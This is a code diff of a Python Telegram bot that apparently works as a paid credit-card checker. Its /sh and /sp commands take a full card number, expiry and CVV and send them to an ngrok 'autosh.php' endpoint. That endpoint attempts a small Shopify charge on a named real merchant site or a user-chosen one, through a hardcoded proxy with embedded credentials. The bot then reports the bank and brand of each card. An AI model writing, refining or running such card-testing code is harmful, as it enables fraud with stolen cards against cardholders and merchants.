@@ -2486,17 +2486,24 @@ async def process_sh(update: Update, context: ContextTypes.DEFAULT_TYPE, payload
         user = update.effective_user
 
         # --- Consume credit ---
-        has_credit = await consume_credit(user.id)
-        if not has_credit:
+        if not await consume_credit(user.id):
             await update.message.reply_text("❌ You don’t have enough credits left.")
             return
 
+        # --- Extract card details ---
         parts = payload.split("|")
+        if len(parts) != 4:
+            await update.message.reply_text(
+                "❌ Invalid format.\nUse: <code>/sh 1234567812345678|12|2028|123</code>",
+                parse_mode=ParseMode.HTML
+            )
+            return
+
         cc, mm, yy, cvv = [p.strip() for p in parts]
 
         # --- API URL ---
         api_url = (
-            "https://7feeef80303d.ngrok-free.app/autosh.php"
+            f"https://7feeef80303d.ngrok-free.app/autosh.php"
             f"?cc={cc}|{mm}|{yy}|{cvv}"
             "&site=https://radiclerootsfarm.com"
             "&proxy=107.172.163.27:6543:nslqdeey:jhmrvnto65s1"
@@ -2506,10 +2513,12 @@ async def process_sh(update: Update, context: ContextTypes.DEFAULT_TYPE, payload
             "⏳ 𝙋𝙧𝙤𝙘𝙚𝙨𝙨𝙞𝙣𝙜 𝙮𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩…"
         )
 
+        # --- Make API request ---
         async with aiohttp.ClientSession() as session:
             async with session.get(api_url, timeout=50) as resp:
                 api_response = await resp.text()
 
+        # --- Parse API response ---
         try:
             data = json.loads(api_response)
         except json.JSONDecodeError:
@@ -2519,14 +2528,14 @@ async def process_sh(update: Update, context: ContextTypes.DEFAULT_TYPE, payload
             )
             return
 
-        # --- Fetch updated credits after deduction ---
+        # --- Fetch updated user credits ---
         updated_user = await get_user(user.id)
         credits_left = updated_user.get("credits", 0)
 
         # --- Extract API fields ---
         response = data.get("Response", "Unknown")
-        gateway = data.get("Gateway", "Unknown")
-        card = data.get("cc", "N/A")
+        gateway = data.get("Gateway", "Shopify")
+        card = data.get("cc", cc)
 
         # --- BIN lookup ---
         bin_number = cc[:6]
@@ -2539,20 +2548,20 @@ async def process_sh(update: Update, context: ContextTypes.DEFAULT_TYPE, payload
         # --- User info ---
         requester = f"@{user.username}" if user.username else str(user.id)
 
-        # --- Developer clickable ---
+        # --- Developer info ---
         DEVELOPER_NAME = "kคli liຖนxx"
         DEVELOPER_LINK = "https://t.me/K4linuxxxx"
         developer_clickable = f"<a href='{DEVELOPER_LINK}'>{DEVELOPER_NAME}</a>"
 
-        # --- Group link + bullet ---
+        # --- Bullet + group link ---
         BULLET_GROUP_LINK = "https://t.me/+pu4_ZBdp1CxiMDE1"
         bullet_link = f"[<a href='{BULLET_GROUP_LINK}'>✗</a>]"
 
         # --- Final formatted message ---
         formatted_msg = (
-            f"═══[ <b>{gateway.upper()}</b> ]═══\n"
+            f"═══[ <b>𝗦𝗛𝗢𝗣𝗜𝗙𝗬</b> ]═══\n"
             f"{bullet_link} <b>𝐂𝐚𝐫𝐝</b> ➜ <code>{card}</code>\n"
-            f"{bullet_link} <b>𝐆𝐚𝐭𝐞𝐰𝐚𝐲</b> ➜ 𝑺𝒉𝒐𝒑𝒊𝒇𝒚 𝟏$💸\n"
+            f"{bullet_link} <b>𝐆𝐚𝐭𝐞𝐰𝐚𝐲</b> ➜ 𝑺𝒉𝒐𝒑𝒊𝒇𝒚 1$💸\n"
             f"{bullet_link} <b>𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞</b> ➜ <i>{response}</i>\n"
             f"――――――――――――――――\n"
             f"{bullet_link} <b>𝐁𝐫𝐚𝐧𝐝</b> ➜ {brand}\n"
@@ -2583,7 +2592,7 @@ async def process_sh(update: Update, context: ContextTypes.DEFAULT_TYPE, payload
 async def sh_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
 
-    # ✅ Cooldown
+    # --- Cooldown check ---
     if not await enforce_cooldown(user.id, update):
         return
 
@@ -2596,16 +2605,10 @@ async def sh_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
 
     payload = " ".join(context.args).strip()
-    parts = payload.split("|")
-    if len(parts) != 4:
-        await update.message.reply_text(
-            "❌ Invalid format.\nUse: <code>/sh 1234567812345678|12|2028|123</code>",
-            parse_mode=ParseMode.HTML
-        )
-        return
 
-    # ✅ Run processing in the background so bot stays responsive
+    # --- Run in background ---
     asyncio.create_task(process_sh(update, context, payload))
+
 
 
 
@@ -2613,13 +2616,14 @@ async def sh_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
 import asyncio
 import aiohttp
 import json
+import re
 from html import escape
 from telegram import Update
 from telegram.constants import ParseMode
 from telegram.ext import ContextTypes
 from db import get_user, update_user, init_db
 
-# Ensure DB is initialized (create missing columns if needed)
+# Ensure DB is initialized
 asyncio.get_event_loop().run_until_complete(init_db())
 
 async def seturl(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -2640,7 +2644,6 @@ async def seturl(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     # --- Fetch user data ---
     user_data = await get_user(user_id)
-
     if user_data.get("custom_url"):
         await update.message.reply_text(
             "❌ 𝙔𝙤𝙪 𝙖𝙡𝙧𝙚𝙖𝙙𝙮 𝙝𝙖𝙫𝙚 𝙖 𝙨𝙞𝙩𝙚 𝙨𝙚𝙩. 𝙍𝙚𝙢𝙤𝙫𝙚 𝙞𝙩 𝙛𝙞𝙧𝙨𝙩 𝙪𝙨𝙞𝙣𝙜 /𝙧𝙚𝙢𝙤𝙫𝙚.",
@@ -2667,20 +2670,20 @@ async def seturl(update: Update, context: ContextTypes.DEFAULT_TYPE):
             async with session.get(api_url, timeout=50) as resp:
                 api_response = await resp.text()
 
-        # --- Parse JSON safely ---
-        try:
-            data = json.loads(api_response)
-        except json.JSONDecodeError:
+        # --- Extract JSON from response using regex ---
+        match = re.search(r'(\{.*\})', api_response, re.DOTALL)
+        if not match:
             await processing_msg.edit_text(
-                f"❌ Invalid response from API:\n<pre>{escape(api_response)}</pre>",
+                f"❌ Could not parse API response.",
                 parse_mode=ParseMode.HTML
             )
             return
 
-        # --- Extract API fields ---
+        data = json.loads(match.group(1))
+
+        # --- Extract fields ---
         response = data.get("Response", "Unknown")
         price = f"{data.get('Price', '1.0')}$"
-
 
         # --- Update user DB safely ---
         await update_user(user_id, custom_url=site_input)
@@ -2691,12 +2694,10 @@ async def seturl(update: Update, context: ContextTypes.DEFAULT_TYPE):
         DEVELOPER_LINK = "https://t.me/K4linuxxxx"
         developer_clickable = f"<a href='{DEVELOPER_LINK}'>{DEVELOPER_NAME}</a>"
 
-        # Clickable bullet linking to your group/channel
-        BULLET_GROUP_LINK = "https://t.me/YourGroupHere"  # <-- replace with your link
+        BULLET_GROUP_LINK = "https://t.me/YourGroupHere"
         bullet_link = f"[<a href='{BULLET_GROUP_LINK}'>✗</a>]"
 
-        # Determine site status
-        site_status = "✅ 𝐒𝐢𝐭𝐞 𝐀𝐝𝐝𝐞𝐝 " if "Error" not in response else "❌ 𝐅𝐚𝐢𝐥𝐞𝐝 𝐭𝐨 𝐀𝐝𝐝 𝐒𝐢𝐭𝐞"
+        site_status = "✅ 𝐒𝐢𝐭𝐞 𝐀𝐝𝐝𝐞𝐝" if "Error" not in response else "❌ 𝐅𝐚𝐢𝐥𝐞𝐝"
 
         formatted_msg = (
             f"═══[ <b>{site_status}</b> ]═══\n"
@@ -2727,7 +2728,6 @@ async def seturl(update: Update, context: ContextTypes.DEFAULT_TYPE):
             f"❌ Error: <code>{escape(str(e))}</code>",
             parse_mode=ParseMode.HTML
         )
-
 
 
 
@@ -2826,6 +2826,16 @@ API_CHECK_TEMPLATE = (
     "&proxy=107.172.163.27:6543:nslqdeey:jhmrvnto65s1"
 )
 
+import re
+import json
+import aiohttp
+import asyncio
+import logging
+from html import escape
+from telegram import Update
+from telegram.constants import ParseMode
+from telegram.ext import ContextTypes
+
 async def sp(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
     user_id = user.id
@@ -2847,7 +2857,10 @@ async def sp(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     # Consume credit
     if not await consume_credit(user_id):
-        await update.message.reply_text("❌ You have no credits left.", parse_mode=ParseMode.HTML)
+        await update.message.reply_text(
+            "❌ You have no credits left.",
+            parse_mode=ParseMode.HTML
+        )
         return
 
     # Fetch user custom site URL
@@ -2875,13 +2888,13 @@ async def sp(update: Update, context: ContextTypes.DEFAULT_TYPE):
     country_flag = bin_details.get("country_emoji", "")
 
     # API call
-    api_url = API_CHECK_TEMPLATE.format(card=card_input, site=custom_url)
+    api_url = f"https://feeef80303d.ngrok-free.app/autosh.php?cc={card_input}&site={custom_url}&proxy=107.172.163.27:6543:nslqdeey:jhmrvnto65s1"
     try:
         async with aiohttp.ClientSession() as session:
             async with session.get(api_url, timeout=120) as resp:
                 api_text = await resp.text()
 
-        # --- Strip PHP warnings / HTML tags ---
+        # Strip PHP warnings / HTML tags
         clean_text = re.sub(r'<[^>]+>', '', api_text).strip()
         json_start = clean_text.find('{')
         if json_start != -1:
@@ -2907,23 +2920,15 @@ async def sp(update: Update, context: ContextTypes.DEFAULT_TYPE):
         DEVELOPER_LINK = "https://t.me/K4linuxxxx"
         developer_clickable = f"<a href='{DEVELOPER_LINK}'>{DEVELOPER_NAME}</a>"
 
-        BULLET_GROUP_LINK = "https://t.me/+9IxcXQ2wO_c0OWQ1"
-        bullet_link = f"[<a href='{BULLET_GROUP_LINK}'>✗</a>]"
-
         formatted_msg = (
-            f"═══[ <b>𝗔𝘂𝘁𝗼𝘀𝗵𝗼𝗽𝗶𝗳𝘆</b> ]═══\n"
-            f"{bullet_link} <b>𝐂𝐚𝐫𝐝</b> ➜ <code>{escape(card_input)}</code>\n"
-            f"{bullet_link} <b>𝐆𝐚𝐭𝐞𝐰𝐚𝐲</b> ➜ 𝙎𝙝𝙤𝙥𝙞𝙛𝙮\n"
-            f"{bullet_link} <b>𝐀𝐦𝐨𝐮𝐧𝐭</b> ➜ {price}\n"
-            f"{bullet_link} <b>𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞</b> ➜ <i>{escape(response_text)}</i>\n"
-            f"――――――――――――――――\n"
-            f"{bullet_link} <b>𝐁𝐫𝐚𝐧𝐝</b> ➜ {brand}\n"
-            f"{bullet_link} <b>𝐁𝐚𝐧𝐤</b> ➜ {issuer}\n"
-            f"{bullet_link} <b>𝐂𝐨𝐮𝐧𝐭𝐫𝐲</b> ➜ {country}\n"
-            f"――――――――――――――――\n"
-            f"{bullet_link} <b>𝐑𝐞𝐪𝐮𝐞𝐬𝐭 𝐁𝐲</b> ➜ {requester}\n"
-            f"{bullet_link} <b>𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫</b> ➜ {developer_clickable}\n"
-            f"――――――――――――――――"
+            "═══[ #𝘀𝗵𝗼𝗽𝗶𝗳𝘆 ]═══\n"
+            f"[✗] 𝐒𝐢𝐭𝐞 ➜ {custom_url}\n"
+            f"[✗] 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ➜ {gateway}\n"
+            f"[✗] 𝐀𝐦𝐨𝐮𝐧𝐭 ➜ {price}\n"
+            "――――――――――――――――\n"
+            f"[✗] 𝐑𝐞𝐪𝐮𝐞𝐬𝐭 𝐁𝐲 ➜ {requester}\n"
+            f"[✗] 𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫 ➜ {developer_clickable}\n"
+            "――――――――――――――――"
         )
 
         await msg.edit_text(
